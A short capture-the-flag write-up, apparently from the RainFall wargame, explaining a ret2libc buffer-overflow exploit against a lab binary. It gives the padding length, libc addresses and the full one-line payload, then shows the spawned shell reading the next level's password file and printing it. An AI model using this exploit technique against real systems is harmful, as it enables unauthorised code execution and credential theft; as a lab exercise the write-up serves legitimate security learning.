# level3

In this level, we have to make a ret2libc, it consist of overwritting the eip address to execute sh

We will inject some instructions after the overflow (80)

```bash
python -c "print('a' * 80 + '<injections>')
```

Let's see the detailled explainations of the [gdb part](gdbwriteup.md) to have more information of the address that we will inject


|  function  |  address   |
|   -------  |  --------  |
|  ret       | 0x0804854b |
|  system    | 0xb7e6b060 |
|  exit      | 0xb7e5ebe0 |
|  /bin/sh   | 0xb7f8cc58 |

We will trigger our ret, use the system call followed by an exit and finally we will inject `/bin/sh` to our eip

```bash
level2@RainFall:~$ (python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')";cat) | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaKaaaaaaaaaaaaK`�����X���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02